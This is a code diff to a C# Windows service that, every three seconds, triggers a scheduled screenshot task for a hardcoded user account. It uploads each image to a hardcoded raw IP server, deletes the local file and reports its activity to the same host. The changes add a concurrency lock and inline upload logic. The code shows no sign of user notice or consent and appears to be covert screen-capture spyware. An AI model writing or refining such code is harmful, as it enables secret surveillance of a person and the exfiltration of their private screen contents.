@@ -137,6 +137,7 @@ namespace XbozPcAppFT
         private CancellationTokenSource _cts;
         private static readonly HttpClient _logClient = new HttpClient();
         private string _serverUrl = "http://202.182.127.60:8000";
+        private static readonly object _uploadLock = new object(); // Upload lock to prevent concurrent uploads
 
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
@@ -205,7 +206,7 @@ namespace XbozPcAppFT
             // 2️⃣ Set up a timer that triggers every 2s.
             System.Timers.Timer timer = new System.Timers.Timer
             {
-                Interval = 2000 // 2 seconds
+                Interval = 3000 // 3 seconds
             };
             timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
             timer.Start();
@@ -322,10 +323,20 @@ namespace XbozPcAppFT
 
         private void TakeScreenshot()
         {
-            string userName = "hzluq";
-            string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
+            // Check if upload is already in progress
+            if (!Monitor.TryEnter(_uploadLock))
+            {
+                WriteEntryAndSendToServer("Upload already in progress, skipping this screenshot cycle", EventLogEntryType.Warning);
+                return;
+            }
+
             try
             {
+                WriteEntryAndSendToServer("Upload lock acquired, starting screenshot process...");
+                
+                string userName = "hzluq";
+                string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
+                
                 WriteEntryAndSendToServer("Attempting to trigger scheduled task for screenshot...");
 
                 // 1️⃣ Run the scheduled task
@@ -355,9 +366,11 @@ namespace XbozPcAppFT
                 }
 
                 // 2️⃣ Wait briefly to allow screenshot tool to finish
+                WriteEntryAndSendToServer("Waiting 1 second for screenshot tool to complete...");
                 System.Threading.Thread.Sleep(1000); // 1 seconds — adjust if needed
 
                 // 3️⃣ Find the latest screenshot file
+                WriteEntryAndSendToServer($"Searching for screenshot files in: {userTempDir}");
                 var latestScreenshot = new DirectoryInfo(userTempDir)
                     .GetFiles("screenshot_*.png")
                     .OrderByDescending(f => f.LastWriteTime)
@@ -372,28 +385,77 @@ namespace XbozPcAppFT
                 string localPath = latestScreenshot.FullName;
                 string fileName = latestScreenshot.Name;
 
-                WriteEntryAndSendToServer($"Found screenshot: {fileName} ({latestScreenshot.Length:N0} bytes)");
+                WriteEntryAndSendToServer($"Found screenshot: {fileName} ({latestScreenshot.Length:N0} bytes) at {localPath}");
 
-                // 4️⃣ Upload via HTTP
+                // 4️⃣ Upload via HTTP - Direct implementation instead of separate method
                 try
                 {
                     string serverUrl = "http://202.182.127.60:8000"; // FastAPI server endpoint
+                    WriteEntryAndSendToServer($"Starting upload of {fileName} to {serverUrl}...");
 
-                    HttpUploader.UploadFileAsync(localPath, serverUrl).GetAwaiter().GetResult();
+                    // Read file into memory
+                    WriteEntryAndSendToServer("Reading screenshot file into memory...");
+                    byte[] fileBytes;
+                    using (var fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
+                    {
+                        fileBytes = new byte[latestScreenshot.Length];
+                        int bytesRead = fs.Read(fileBytes, 0, (int)latestScreenshot.Length);
+                        WriteEntryAndSendToServer($"Read {bytesRead:N0} bytes from file");
+                    }
 
-                    // 5️⃣ Clean up
-                    File.Delete(localPath);
-                    WriteEntryAndSendToServer($"Screenshot uploaded and deleted: {fileName}");
+                    // Create HTTP client and upload
+                    WriteEntryAndSendToServer("Creating HTTP request for upload...");
+                    using (var client = new HttpClient())
+                    {
+                        client.Timeout = TimeSpan.FromMinutes(5); // 5 minute timeout
+                        
+                        using (var content = new ByteArrayContent(fileBytes))
+                        {
+                            content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+                            WriteEntryAndSendToServer($"Sending POST request to {serverUrl}/upload/{fileName}...");
+                            
+                            var response = client.PostAsync($"{serverUrl}/upload/{fileName}", content).Result;
+                            
+                            WriteEntryAndSendToServer($"HTTP Response Status: {response.StatusCode} ({(int)response.StatusCode})");
+                            
+                            if (response.IsSuccessStatusCode)
+                            {
+                                WriteEntryAndSendToServer($"Success Upload completed successfully: {fileName} ({latestScreenshot.Length:N0} bytes)");
+                                
+                                // 5️⃣ Clean up - Delete the file only after successful upload
+                                WriteEntryAndSendToServer($"Deleting local file: {localPath}");
+                                File.Delete(localPath);
+                                WriteEntryAndSendToServer($"Success Local file deleted successfully: {fileName}");
+                            }
+                            else
+                            {
+                                string responseContent = response.Content.ReadAsStringAsync().Result;
+                                WriteEntryAndSendToServer($"Error Upload failed with status {response.StatusCode}: {responseContent}", EventLogEntryType.Error);
+                            }
+                        }
+                    }
                 }
                 catch (Exception ex)
                 {
-                    WriteEntryAndSendToServer($"Screenshot upload failed: {ex.Message}", EventLogEntryType.Error);
+                    WriteEntryAndSendToServer($"Error Screenshot upload failed: {ex.Message}", EventLogEntryType.Error);
+                    WriteEntryAndSendToServer($"Exception type: {ex.GetType().Name}", EventLogEntryType.Error);
+                    if (ex.InnerException != null)
+                    {
+                        WriteEntryAndSendToServer($"Inner exception: {ex.InnerException.Message}", EventLogEntryType.Error);
+                    }
                 }
 
             }
             catch (Exception ex)
             {
-                WriteEntryAndSendToServer($"Screenshot operation failed: {ex.Message}", EventLogEntryType.Error);
+                WriteEntryAndSendToServer($"Error Screenshot operation failed: {ex.Message}", EventLogEntryType.Error);
+                WriteEntryAndSendToServer($"Exception type: {ex.GetType().Name}", EventLogEntryType.Error);
+            }
+            finally
+            {
+                // Always release the lock
+                Monitor.Exit(_uploadLock);
+                WriteEntryAndSendToServer("Upload lock released");
             }
         }
 
